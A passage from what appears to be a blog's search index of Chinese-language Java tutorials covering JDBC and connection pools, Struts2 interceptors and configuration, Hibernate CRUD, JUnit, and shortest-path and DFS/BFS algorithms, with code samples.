try(Statement s = conn.createStatement(); )&#123; boolean hasResultSet = s.execute("SELECT * FROM stu;");//判断有没有结果集 if(hasResultSet)&#123; try(ResultSet rs = s.getResultSet())&#123;//获取结果集 ResultSetMetaData rsmd = rs.getMetaData();//获取结果集元数据 while (rs.next()) &#123; for (int i = 1; i &lt;= rsmd.getColumnCount(); i++) &#123; System.out.print(rs.getString(i)+"\t"); &#125; System.out.print("\n"); &#125; &#125; &#125; &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; //省略释放资源代码&#125; 预编译的PreparedStatementPreparedStatement是Statement的子接口，可以预编译SQL语句，效率高，还可以防注入。123456789101112131415161718public class JDBCTest &#123; //省略初始化代码 @Test public void testPreparedStatement()&#123; try(PreparedStatement ps = conn.prepareStatement( "INSERT INTO stu(sname, age) VALUES(?,?) ");//预编译SQL语句 )&#123; for(int i = 0; i &lt; 3; i++)&#123; ps.setString(1,"stu"+i);//填充占位符 ps.setInt(2, 20+i);//填充占位符 ps.executeUpdate();//提交 &#125; &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; //省略释放资源代码&#125; 调用存储过程的CallableStatementMySQL常用语句 自定义一个加法的存储过程12345delimiter //create procedure add_num(in a int, in b int, out sum int)beginset sum = a + b;end// 123456789101112131415public class JDBCTest &#123; //省略初始化代码 @Test public void testCallableStatement() throws Exception&#123; try(CallableStatement cs = conn.prepareCall("&#123;CALL add_num(?,?,?)&#125;");)&#123; int a = 5, b = 3; cs.setInt(1, a); cs.setInt(2, b); cs.registerOutParameter(3, Types.INTEGER); cs.execute(); System.out.println(a+"+"+b+"="+cs.getInt(3)); &#125; &#125; //省略释放资源代码&#125; 事务 123456789101112131415public class JDBCTest &#123; //省略初始化代码 @Test public void testTransaction() throws SQLException &#123; conn.setAutoCommit(false); // 关闭事务自动提交 Statement s = conn.createStatement(); s.executeUpdate("INSERT INTO stu(sname) VALUES ('stu1');"); s.executeUpdate("INSERT INTO stu(sname) VALUES ('stu2');"); Savepoint sp = conn.setSavepoint("事务中间点"); // 设置事务中间点 s.executeUpdate("INSERT INTO stu(sname) VALUES ('stu3');"); conn.rollback(sp); // 回滚事务 conn.commit(); // 提交事务 &#125; //省略释放资源代码&#125; 数据库连接池DBCP数据源Tomcat的连接池使用DBCP连接池。在maven中导入12345&lt;dependency&gt; &lt;groupId&gt;commons-dbcp&lt;/groupId&gt; &lt;artifactId&gt;commons-dbcp&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt;&lt;/dependency&gt; 从数据库连接池中获取数据库连接12345678910111213141516171819public class JDBCTest &#123; //省略初始化代码 @Test public void testDBCP() throws SQLException &#123; //BasicDataSource bds = BasicDataSourceFactory.createDataSource(properties);//另一种创建方式 BasicDataSource bds = new BasicDataSource(); bds.setDriverClassName(driver); // 加载驱动 bds.setUrl(url); // 设置url bds.setUsername(username); // 设置用户名 bds.setPassword(password); // 设置密码 bds.setInitialSize(5); //设置连接池的初始连接数 bds.setMaxActive(20); //设置连接池最多可有20个活动连接数 bds.setMinIdle(2); //设置连接池中最少有2个空闲的连接 Connection conn = bds.getConnection(); //执行sql语句 conn.close();//释放连接，归还连接池 &#125; //省略释放资源代码&#125; C3P0数据源Hibernate的连接池使用C3P0连接池。在maven中导入12345&lt;dependency&gt; &lt;groupId&gt;c3p0&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.1.2&lt;/version&gt;&lt;/dependency&gt; 从数据库连接池中获取数据库连接123456789101112131415161718public class JDBCTest &#123; //省略初始化代码 @Test public void testC3P0() throws PropertyVetoException, SQLException &#123; ComboPooledDataSource cpds = new ComboPooledDataSource(); cpds.setDriverClass(driver); // 加载驱动 cpds.setJdbcUrl(url); // 设置url cpds.setUser(username); // 设置用户名 cpds.setPassword(password); // 设置密码 cpds.setMaxPoolSize(40); //设置连接池的最大连接数 cpds.setMinPoolSize(2); //设置连接池的最小连接数 cpds.setInitialPoolSize(10); //设置连接池的初始连接数 cpds.setMaxStatements(190); //设置连接池的缓存Statement的最大数 Connection conn = cpds.getConnection(); //执行SQL语句 conn.close(); &#125; //省略释放资源代码&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2自定义拦截器]]></title>
    <url>%2Fposts%2FStruts2_how_to_Custom_interceptors.html</url>
    <content type="text"><![CDATA[实现实现Interceptor接口12345678public interface Interceptor extends Serializable &#123; void init();//初始化拦截器所需资源 void destroy();//释放在init()中分配的资源 String intercept(ActionInvocation invocation) throws Exception; //实现拦截器功能 //利用invocation.getAction()获取Action状态 //返回result作为逻辑视图名，比如success&#125; 继承AbstractInterceptor抽象类AbstractInterceptor类实现了Interceptor接口12345public class AbstractInterceptor implements Interceptor&#123; void init()&#123;&#125;//空实现 void destroy()&#123;&#125;//空实现 String intercept(ActionInvocation invocation) throws Exception;&#125; 配置在struts.xml中注册拦截器12345678910&lt;struts&gt; &lt;package name="default" extends="struts-default"&gt; &lt;interceptors&gt;&lt;!--注册拦截器--&gt; &lt;interceptor name="myInterceptor" class="包名.MyInterceptor" /&gt; &lt;/interceptors&gt; &lt;action name="myAction" class="包名.MyAction"&gt; &lt;interceptor-ref name="myInterceptor" /&gt;&lt;!--引用拦截器--&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 内置拦截器在struts-default.xml中 拦截器 作用 params拦截器 负责将请求参数设置为Action属性 staticParams拦截器 将配置文件中action元素的子元素param参数设置为Action属性 servletConfig拦截器 将源于ServletAPI的各种对象注入到Action，必须实现对应接口 fileUpload拦截器 对文件上传提供支持，将文件和元数据设置到对应的Action属性 exception拦截器 捕获异常，并且将异常映射到用户自定义的错误界面 validation拦截器 调用验证框架进行数据验证 简单功能计算Action执行时间123456789public class TimerInterceptor extends AbstractInterceptor&#123; public String intercept(ActionInvocation invocation) throws Exception&#123; long start = System.currentTimeMillis(); String result = invocation.invoke();//执行下一个拦截器，如果没有拦截器就执行Action，返回视图名，如"success" long end = System.currentTimeMillis(); System.out.println("时间："+(end-start)/1000+"s"); return result; &#125;&#125; 权限校验1234567891011public class AuthInterceptor extends AbstractInterceptor&#123; public String intercept(ActionInvocation invocation) throws Exception&#123; ActionContext context = ActionContext.getContext(); Map&lt;String, Object&gt; session = context.getSession(); if(session.get("loginInfo")!=null) &#123; //已登录 return invocation.invoke(); &#125; else &#123;//未登录 return "login";//需要登录 &#125; &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hibernate简单使用]]></title>
    <url>%2Fposts%2FHibernate_simple_use.html</url>
    <content type="text"><![CDATA[前言使用IDEA+Maven进行搭建Hibernate5 步骤导入在pom.mxl中加入maven项目123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-search-orm&lt;/artifactId&gt; &lt;version&gt;5.5.5.Final&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;6.0.5&lt;/version&gt; &lt;/dependency&gt;&lt;dependencies&gt; 创建配置文件在/src/main/resources/hibernate.cfg.xml中配置1234567891011121314151617181920&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC "-//Hibernate/Hibernate Configuration DTD//EN" "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd"&gt;&lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;!--访问数据库的url地址，带参数防止编译错误--&gt; &lt;property name="connection.url"&gt;jdbc:mysql://localhost:3306/test?serverTimezone=GMT&amp;useUnicode=true&amp;characterEncoding=utf8&lt;/property&gt; &lt;property name="connection.driver_class"&gt;com.mysql.jdbc.Driver&lt;/property&gt;&lt;!--数据库的JDBC驱动--&gt; &lt;property name="connection.username"&gt;root&lt;/property&gt;&lt;!--连接数据库的用户名--&gt; &lt;property name="connection.password"&gt;root&lt;/property&gt;&lt;!--连接数据库的用户密码--&gt; &lt;property name="dialect"&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt;&lt;!--指定使用mysql数据库的方言--&gt; &lt;property name="show_sql"&gt;true&lt;/property&gt;&lt;!--在控制台输出sql语句--&gt; &lt;property name="format_sql"&gt;true&lt;/property&gt;&lt;!--在控制台格式化sql语句--&gt; &lt;property name="hbm2ddl.auto"&gt;create&lt;/property&gt;&lt;!--生成表结构的策略--&gt; &lt;mapping resource="students.hbm.xml"/&gt; &lt;mapping class="com.ahao.javaeeDemo.Students"/&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; 创建实体123456//Students.javapublic class Student&#123; private int sid; private String sname; //构造器、getter和setter&#125; 12345678910111213141516&lt;!--students.hbm.xml--&gt;&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC "-//Hibernate/Hibernate Mapping DTD 3.0//EN" "http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd"&gt;&lt;hibernate-mapping&gt; &lt;class name="com.ahao.javaeeDemo.Students" table="students"&gt; &lt;id name="sid" type="int"&gt; &lt;column name="sid"/&gt; &lt;generator class="increment"/&gt; &lt;/id&gt; &lt;property name="sname" type="java.lang.String"&gt; &lt;column name="sname"/&gt; &lt;/property&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; 编写测试代码123456789101112131415161718192021222324252627282930313233343536public class MainTest &#123; private static ServiceRegistry serviceRegistry; private static SessionFactory sessionFactory; private static Session session; private static Transaction transaction; @BeforeClass public static void initClass()&#123; //创建服务注册对象 serviceRegistry = new StandardServiceRegistryBuilder() .configure("hibernate.cfg.xml").build(); //创建会话工厂对象 sessionFactory = new MetadataSources(serviceRegistry).buildMetadata().buildSessionFactory(); //创建会话对象 session = sessionFactory.openSession(); //开启事务 transaction = session.beginTransaction(); &#125; @Test public void testSave()&#123; Students s = new Students(); s.setSname("zhangsan"); s.setBirthday(new java.sql.Date(System.currentTimeMillis())); session.save(s); &#125; @AfterClass public static void destoryClass()&#123; //提交事务 transaction.commit(); //关闭会话 session.close(); //关闭会话工厂 sessionFactory.close(); &#125;&#125; 操作增使用save()1234567891011public class MainTest &#123; //省略初始化代码 @Test public void testSave()&#123; Students s = new Students(); s.setSname("zhangsan"); s.setBirthday(new java.sql.Date(System.currentTimeMillis())); session.save(s); &#125; //省略销毁代码&#125; 改使用update()123456789101112public class MainTest &#123; //省略初始化代码 @Test public void testUpdate()&#123; int sid = 1; Students s = session.get(Students.class, sid); s.setSname("Cat"); session.update(s);// session.saveOrUpdate(s); &#125; //省略销毁代码&#125; 删使用delete()12345678910public class MainTest &#123; //省略初始化代码 @Test public void testDelete()&#123; int sid = 1; Students s = session.get(Students.class, sid); session.delete(s); &#125; //省略销毁代码&#125; 查查询单个记录使用get()或load()1234567891011public class MainTest &#123; //省略初始化代码 @Test public void testRead()&#123; int sid = 1; Students s1 = session.get(Students.class, sid);//发送sql语句，获取Students对象 System.out.println(s1.toString());//打印输出 Students s2 = session.load(Students.class, sid);//不发送sql语句，获取一个代理对象 System.out.println(s2.toString());//使用的时候才发送sql语句，获取Students对象 &#125; //省略销毁代码&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Hibernate</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最短路径]]></title>
    <url>%2Fposts%2FThe_Shortest_path.html</url>
    <content type="text"><![CDATA[前言最短路径算法一般是广搜算法。有多种情况，单源最短路径，多源最短路径，负权回路等问题 .fancybox { display: inline-block; } 多源最短路径Floyd-Warshall算法 优点：实现简单，代码量少 缺点：时间复杂度为O(n^3)，不能解决负权回路的问题 使用邻接矩阵存储法存储图 遍历每个节点作为中转点，取距离的最小值比如1到3，a[1][3]=6以2作为中转点，即a[1][2]+a[2][3]=5&lt;a[1][3] 伪代码12345678910function floyd(map, length) &#123; var i,j,k; for(k for 0 to length)&#123;//k为中转点，每个点都可以是中转点 for(i for 0 to length)&#123;//起点i for(j for 0 to length)&#123;//终点j map[i][j] = min(map[i][j], map[i][k]+map[k][j]); &#125; &#125; &#125;&#125; 单源最短路径Dijkstra算法 假设有一个数组 dis[]，存储第一个点能到达的所有点的距离，{0,1,12,∞,∞,∞},那么, dis[] 就是 第一个点1 到达所有点的最短距离。dis[] 为 {0,1,12,∞,∞,∞}。 从dis[]数组可以看出, 距离第一个点1最近的点是第二个点2, 将其作为中转点。再从矩阵map[2][j]中获取所有与第二个点B邻接的点, 即第三个点3和第四个点4,用dis[j]加上3、4和2的距离，如果小于最小值dis[j], 则更新dis[j]的值。dis[] 为 {0,1,10,4,∞,∞}。 再找dis[]数组的最小点, 因为点2已经使用过了, 所以选择 点4作为中转点。dis[] 为 {0,1,8,4,17,19}。 以此类推以点3作为中转点, dis[] 为 {0,1,8,4,13,19}。以点5作为中转点, dis[] 为 {0,1,8,4,13,17}。还剩下最后一个 点6, 没必要找了, 因为没有另一个点可以到达了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Main&#123; private static int MAX_STEP = 1000; public static void main(String[] args) throws Exception &#123; Scanner in = new Scanner(System.in); int n = in.nextInt();//顶点数 int m = in.nextInt();//边数 int[][] map = new int[n+1][n+1];//存储图的邻接矩阵 boolean[] book = new boolean[n+1];//标记某个点是否走过 int[] dis = new int[n+1];//存储最短距离的数组 for(int i = 1; i &lt;= n; i++) &#123; for(int j = 1; j &lt;= n; j++)&#123; if(i==j) map[i][j] = 0; else map[i][j] = MAX_STEP; &#125; &#125; for(int i = 1; i &lt;= m; i++)&#123; map[in.nextInt()][in.nextInt()] = in.nextInt(); &#125; for(int i = 1; i &lt;= n; i++)&#123; dis[i] = map[1][i]; &#125; //初始化完毕 book[1] = true; for(int i = 1; i &lt;= n-1; i++)&#123;//遍历第1到n-1个点 int min = MAX_STEP; int next = 0; for(int j = 1; j &lt;=n; j++)&#123;//找到距离第i个点最近的一个点作为中转点 if(book[j]==false &amp;&amp; dis[j]&lt;min)&#123; min = dis[j]; next = j; &#125; &#125; book[next] = true; for(int j = 1; j &lt;= n; j++)&#123;//根据中转点获得新的距离，用来更新dis dis[j] = Math.min(dis[j], dis[next]+map[next][j]); &#125; printf(dis); &#125; &#125; private static void printf(int[] arr)&#123; for(int i = 0; i &lt; arr.length; i++)&#123; System.out.print(arr[i]+" "); &#125; System.out.println(""); &#125;&#125; 另外还有邻接表存储图的算法(看不懂, 弃了) 单源最短路径Bellman-Ford算法 和Dijkstra算法一样, 假设有一个数组 dis[],存储第一个点能到达的所有点的距离，{0,∞,∞,∞,∞,∞},那么, dis[] 就是 第一个点0 到达所有点的最短距离。dis[] 为 {0,∞,∞,∞,∞,∞}, 注意这里和Dijkstra算法不一样。 扫描第一条边0 1 1, 点0 到 点1 的权值为 1。因为 点0是起点, 所以原先的dis[0]+第一条边的权值w[1]&lt;原先的dis[1], 也就是0+1&lt;∞。通过第一条边, 可以把 dis[]更新为{0,1,∞,∞,∞,∞}。 扫描第二条边0 2 12, 点0 到 点2 的权值为 12。因为 点0是起点, 所以原先的dis[0]+第二条边的权值w[2]&lt;原先的dis[2], 也就是0+12&lt;∞。通过第一条边, 可以把 dis[]更新为{0,1,12,∞,∞,∞}。 扫描第三条边1 2 9, 点1 到 点2 的权值为 9。因为 点1是起点, 所以原先的dis[1]+第三条边的权值w[3]&lt;原先的dis[2], 也就是1+9&lt;12。通过第一条边, 可以把 dis[]更新为{0,1,10,∞,∞,∞}。 依次类推,扫描第4条边1 3 3, dis[]数组 为 {0,1,10,4,∞,∞}。扫描第5条边2 4 5, dis[]数组 为 {0,1,10,4,15,∞}。扫描第6条边3 2 4, dis[]数组 为 {0,1,8,4,15,∞}。扫描第7条边3 4 13, dis[]数组 为 {0,1,8,4,15,∞}。扫描第8条边3 5 15, dis[]数组 为 {0,1,8,4,15,19}。扫描第9条边4 5 4,dis[]数组 为 {0,1,8,4,15,19}。 第一轮扫描完毕, 一共要扫描 顶点数-1轮。因为任意两点之间最多包含顶点数-1条边。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public class Main &#123; public static void main(String[] args) &#123; /** 6 9 0 1 1 0 2 12 1 2 9 1 3 3 2 4 5 3 2 4 3 4 13 3 5 15 4 5 4 */ Scanner in = new Scanner(System.in); int n = in.nextInt(), m = in.nextInt(); int[] dis = new int[n]; // 第0个顶点距离其他顶点的距离 int[] u = new int[m];// 第i条边的起点 int[] v = new int[m];// 第i条边的终点 int[] w = new int[m];// 第i条边的权值 for(int i = 0; i &lt; m; i++)&#123; u[i] = in.nextInt(); v[i] = in.nextInt(); w[i] = in.nextInt(); &#125; dis[0] = 0; for(int i = 1; i &lt; n; i++)&#123; dis[i] = 999; &#125; // 初始化完毕 boolean equals = false; int[] backupDis = new int[m]; // 扫描 顶点数-1 轮 for(int k = 0; k &lt; n-1 &amp;&amp; !equals; k++)&#123; backup(dis, backupDis); // 备份距离数组 for(int i = 0; i &lt; m; i++)&#123; dis[v[i]] = Math.min(dis[v[i]], dis[u[i]]+w[i]); // 扫描每条边, 更新dis数组 &#125; equals = equals(dis, backupDis); // 扫描后dis数组是否有变化, 没有则已经是最短路径 &#125; boolean isLoop = false; for(int i = 0; i &lt; m &amp;&amp; !isLoop; i++)&#123; if(dis[v[i]] &gt; dis[u[i]]+w[i])&#123; isLoop = true; // 如果还能继续更新, 说明有负权回路 &#125; &#125; System.out.println(isLoop?'有':'无'+"负权回路"); if(!isLoop)&#123; System.out.println(Arrays.toString(dis)); &#125; &#125; private static void backup(int[] src, int[] backup)&#123; System.arraycopy(src, 0, backup, 0, src.length); &#125; private static boolean equals(int[] src, int[] other)&#123; if(src.length!=other.length) return false; for(int i = 0, len = src.length; i &lt; len; i++) &#123; if(src[i]!=other[i]) return false; &#125; return true; &#125;&#125; 总结 算法 单、多源 算法核心 空间复杂度 时间复杂度 适用情况 Floyd-Warshall 多源 中转点 O(N^2) O(N^3) 稠密图, 解决负权回路 Dijkstra 单源 中转点 O(M) O((M+N)logN) 稠密图 Bellman-Ford 单源 边 O(M) O(NM) 稀疏图, 解决负权回路]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深搜广搜算法]]></title>
    <url>%2Fposts%2FDFS_and_BFS.html</url>
    <content type="text"><![CDATA[深搜全排列现有n个字符，要求进行全排列，比如abc三个字符，则有abc，acb，bac，bca，cab，cba，6种排列。 java代码1234567891011121314151617181920212223242526272829303132333435public class Main&#123; private static char[] arr;//待全排列字符数组 private static char[] box;//盒子 private static boolean[] flag;//标记 public static void main(String[] args) throws Exception &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); arr = new char[n]; box = new char[n]; flag = new boolean[n]; for(int i = 0; i &lt; n; i++)&#123; arr[i] = in.next().charAt(0); &#125; dfs(0); //核心算法 &#125; private static void dfs(int step)&#123;//前step个字符已排列，正在排列第step个字符 if(step == box.length) &#123;//当全部字符排列完毕，输出并return printf(box); return; &#125; for(int i = 0; i &lt; box.length; i++)&#123; if(flag[i]==true) continue;//第i个字符已使用则跳出 box[step] = arr[i];//将第i个字符放入第step个盒子 flag[i] = true;//标记第i个字符已使用 dfs(step+1); flag[i] = false;//标记第i个字符未使用 &#125; &#125; private static void printf(char[] flag)&#123; for(int i = 0; i &lt; flag.length; i++)&#123; System.out.print(flag[i]+" "); &#125; System.out.println(""); &#125;&#125; 走迷宫现有一个n*m的迷宫，标记从起点(startx,starty)到终点(endx,endy)的一条路径例如，0为可行，1为墙壁，2为走过的路径标记，起点为(0,0)，终点为(3,3)12340 1 0 10 0 0 10 0 0 01 0 0 0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Main&#123; public static void main(String[] args) throws Exception &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); int m = in.nextInt(); int startx = in.nextInt(); int starty = in.nextInt(); int endx = in.nextInt(); int endy = in.nextInt(); int[][] maze = new int[n+1][m+1]; for(int i = 1; i &lt;= n; i++)&#123; for(int j = 1; j &lt;= m; j++)&#123; maze[i][j] = in.nextInt(); &#125; &#125; maze[startx][starty] = 2; dfs(startx,starty,endx,endy,maze); &#125; private static void dfs(int startx, int starty, int endx, int endy, int[][] maze) &#123; if(startx==endx&amp;&amp;starty==endy)&#123; printf(maze); return; &#125; if(startx-1 &gt;= 1 &amp;&amp; maze[startx-1][starty]==0)&#123;//往上走 maze[startx-1][starty]=2; dfs(startx-1,starty,endx,endy,maze); maze[startx-1][starty] = 0; &#125; if(startx+1 &lt;= maze.length-1 &amp;&amp; maze[startx+1][starty]==0)&#123;//往下走 maze[startx+1][starty]=2; dfs(startx+1,starty,endx,endy,maze); maze[startx+1][starty]=0; &#125; if(starty-1 &gt;= 1 &amp;&amp; maze[startx][starty-1]==0)&#123;//往左走 maze[startx][starty-1]=2; dfs(startx,starty-1,endx,endy,maze); maze[startx][starty-1]=0; &#125; if(starty+1 &lt;= maze[startx].length-1 &amp;&amp; maze[startx][starty+1]==0)&#123;//往右走 maze[startx][starty+1]=2; dfs(startx,starty+1,endx,endy,maze); maze[startx][starty+1]=0; &#125; &#125; private static void printf(int[][] arr)&#123; for(int i = 0; i &lt; arr.length; i++)&#123; for(int j = 0; j &lt; arr[i].length; j++)&#123; System.out.print(arr[i][j]+" "); &#125; System.out.println(""); &#125; &#125;&#125; 广搜走迷宫之最短路径现有一个n*m的迷宫，输出从起点(startx,starty)到终点(endx,endy)的最短路径步数例如，0为可行，*为墙壁，起点为(0,0)，终点为(3,3)12340 1 0 10 0 0 10 0 0 01 0 0 0 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public class Main&#123; public static void main(String[] args) throws Exception &#123; Scanner in = new Scanner(System.in); int n = in.nextInt(); int m = in.nextInt(); int startX = in.nextInt(); int startY = in.nextInt(); int endX = in.nextInt(); int endY = in.nextInt(); char[][] maze = new char[n+1][m+1]; for(int i = 1; i &lt;= n; i++)&#123; for(int j = 1; j &lt;= m; j++)&#123; maze[i][j] = in.next().charAt(0); &#125; &#125; int[] queueX = new int[n*n];//x坐标队列 int[] queueY = new int[n*n];//y坐标队列 int head = 0;//头指针 int tail = 1;//尾指针 queueX[head] = startX;//起点入队 queueY[head] = startY; maze[queueX[head]][queueY[head]] = (char)('a'); while(tail-head&gt;0)&#123;//判断队列不为空 int x = queueX[head]; int y = queueY[head]; printf(maze); if(x==endX &amp;&amp; y==endY)&#123;//到达终点 System.out.println(maze[endX][endY]-'a'); break; &#125; if(x-1&gt;=1 &amp;&amp; maze[x-1][y]=='0')&#123;//往左走 maze[x-1][y] = (char) (maze[x][y]+1); queueX[tail] = x-1;//入队 queueY[tail] = y; tail++; &#125; if(x+1&lt;=maze.length-1 &amp;&amp; maze[x+1][y]=='0')&#123;//往右走 maze[x+1][y] = (char) (maze[x][y]+1); queueX[tail] = x+1;//入队 queueY[tail] = y; tail++; &#125; if(y-1&gt;=1 &amp;&amp; maze[x][y-1]=='0')&#123;//往上走 maze[x][y-1] = (char) (maze[x][y]+1); queueX[tail] = x;//入队 queueY[tail] = y-1; tail++; &#125; if(y+1&lt;=maze[x].length-1 &amp;&amp; maze[x][y+1]=='0')&#123;//往下走 System.out.println((y+1)+","+maze[x].length+","+maze[x][y+1]); maze[x][y+1] = (char) (maze[x][y]+1); queueX[tail] = x;//入队 queueY[tail] = y+1; tail++; &#125; head++;//出队 &#125; &#125; private static void printf(char[][] maze)&#123; for(int i = 1; i &lt; maze.length; i++)&#123; for(int j = 1; j &lt; maze[i].length; j++)&#123; System.out.print(maze[i][j]+" "); &#125; System.out.println(""); &#125; System.out.println(""); &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JUnit单元测试]]></title>
    <url>%2Fposts%2Fjunit_foundation.html</url>
    <content type="text"><![CDATA[常规的单元测试编写被测试类进行单元测试首先需要一个被测试类和被测试方法12345public class Div&#123; public static void div(int a, int b)&#123; return a/b; &#125;&#125; 编写测试类12345678910111213141516171819public class DivTest &#123; @BeforeClass public static void initClass()&#123; System.out.println("加载类前执行"); &#125; @Before public void init()&#123; System.out.println("执行每个方法前执行"); &#125; @Test public void divTest()&#123; TestCase.assertEquals(3, Div.div(6,2)); System.out.println("预期值为3,实际值为3"); &#125; @After public void destory()&#123; System.out.println("执行每个方法后执行"); &#125; @AfterClass public static void destoryClass()&#123; System.out.println("执行完所有Test方法后执行"); &#125;&#125; 其他常用注释@Test expected：预期会抛出某个异常 timeout：预期运行时间不超过xx毫秒 1234567public class DivTest &#123; @Test(expected = ArithmeticException.class, timeout = 2000) public void divTest()&#123; TestCase.assertEquals(3, Div.div(6,0)); //会抛出ArithmeticException异常，由于expected捕获了异常，所以不会抛出 &#125;&#125; @Ignore12345678public class DivTest &#123; @Ignore @Test() public void divTest()&#123; TestCase.assertEquals(3, Div.div(6,0)); //这个方法不执行，被忽略 &#125;&#125; 测试套件的使用（多个测试类一起执行）有时候需要将几个测试类一起测试，需要用到测试套件12345@RunWith(Suite.class)//修改JUnit的默认执行类,默认值为Suite.class@Suite.SuiteClasses(&#123;DivTest.class,DivTest.class&#125;)//接收一个Class数组，表示要测试的类public class SuiteTest &#123; //空类体，本测试套件将执行DivTest两次&#125; 参数化设置（编写测试用例）1234567891011121314151617181920212223242526@RunWith(Parameterized.class)//修改JUnit的默认执行类public class ParameterizdTest &#123; int expected = 0; int input1 = 0; int input2 = 0; public ParameterizdTest(int expected, int input1, int input2)&#123; this.expected = expected; this.input1 = input1; this.input2 = input2; &#125; //实现一个被@Parameterized.Parameters注解修饰的返回Collection的方法 @Parameterized.Parameters public static Collection&lt;Object[]&gt; t()&#123; return Arrays.asList(new Object[][]&#123; &#123;3, 6, 2&#125;, &#123;4, 4, 2&#125; &#125;); &#125; @Test public void divTest()&#123; TestCase.assertEquals(expected, Div.div(input1, input2)); &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>JUnit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2访问ServletAPI]]></title>
    <url>%2Fposts%2FStruts2_how_to_aware_ServletAPI.html</url>
    <content type="text"><![CDATA[前言Servlet API就是HttpServletRequest(Request)、HttpSession(Session)、ServletContext(Application) 通过ActionContext类访问123456789101112131415ActionContext ctx = ActionContext.getContext();//单例模式//访问applicationMap&lt;String, Object&gt; application = ctx.getApplication();//Map对象模拟ServletContext实例application.put("key", value);Object value = application.get("key");ctx.setApplication(map);//传入一个新的Map//访问SessionMap&lt;String, Object&gt; session= ctx.getSession();//Map对象模拟ServletContext实例application.put("key", value);Object value = application.get("key");ctx.setSession(map);//传入一个新的Map//访问Requestctx.put("key", value);//类似调用request.putAttribute("key", value)Object value = ctx.get("key");//类似调用request.getAttribute("key")Map&lt;String, Object&gt; request = ctx.getParameters();//类似调用request.getParameterMap() 实现XxxAware接口 ServletContextAware ：直接访问ServletContext(application) 实例 ServletRequestAware ：直接访问HttpServletRequest(request) 实例 ServletResponseAware：直接访问HttpServletResponse(response)实例 通过ServletActionContext类访问1234PageContext pageContext = ServletActionContext.getPageContext();HttpServletRequest request = ServletActionContext.getRequest();HttpServletResponse response = ServletActionContext.getResponse();ServletContext application = ServletActionContext.getServletContext();]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2修改url后缀]]></title>
    <url>%2Fposts%2FStruts2_how_to_custom_url_suffix.html</url>
    <content type="text"><![CDATA[前言使用struts2的url一般为http://localhost:8080/test.action有时候需要改为http://localhost:8080/test.html 在struts.xml中配置123&lt;struts&gt; &lt;constant name="struts.action.extension" value="html"&gt;&lt;/struts&gt; 在struts.properties中配置1struts.action.extension=action,do,struts2, 在web.xml的filter中配置12345678&lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;struts.action.extension&lt;/param-name&gt; &lt;param-value&gt;action,do,struts2,&lt;/param-name&gt; &lt;/init-param&gt;&lt;/filter&gt;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2接收参数]]></title>
    <url>%2Fposts%2FStruts2_how_to_access_parameters.html</url>
    <content type="text"><![CDATA[使用Action的属性接收参数123456&lt;!--表单loginJSP.jsp--&gt;&lt;form action="myAction" method="post"&gt; &lt;input type="text" name="username"/&gt; &lt;input type="password" name="password" /&gt; &lt;input type="submit" value="提交" /&gt;&lt;/form&gt; 123456789public class MyAction extends ActionSupport&#123; private String username; private String password; public String execute() throws Exception&#123; System.out.println(getUsername()+":"+getPassword()); return SUCCESS; &#125; //getter和setter方法，重要！Struts2是通过反射完成的！&#125; 使用Domain Model接收参数123456&lt;!--表单loginJSP.jsp--&gt;&lt;form action="myAction" method="post"&gt; &lt;input type="text" name="user.username"/&gt;&lt;!--指定对象名--&gt; &lt;input type="password" name="user.password" /&gt;&lt;!--指定对象名--&gt; &lt;input type="submit" value="提交" /&gt;&lt;/form&gt; 12345678910111213public class User&#123; private String username; private String password; 